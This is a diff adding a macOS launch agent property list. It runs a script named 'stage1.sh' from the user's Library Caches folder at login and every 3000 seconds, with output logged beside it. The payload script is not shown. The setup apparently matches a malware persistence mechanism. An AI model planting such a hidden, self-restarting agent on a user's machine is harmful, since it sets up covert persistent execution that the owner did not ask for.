@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.stage.onenor</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>~/Library/Caches/stage1.sh</string>
+	</array>
+        <key>RunAtLoad</key>
+	<true/>
+	<key>StartInterval</key>
+        <integer>3000</integer>
+        <key>AbandonProcessGroup</key>
+        <true/>
+	<key>StandardErrorPath</key>
+        <string>~/Library/Caches/stage-stderr.log</string>
+
+       <key>StandardOutPath</key>
+       <string>~/Library/Caches/stage-stdout.log</string>
+</dict>
+</plist>
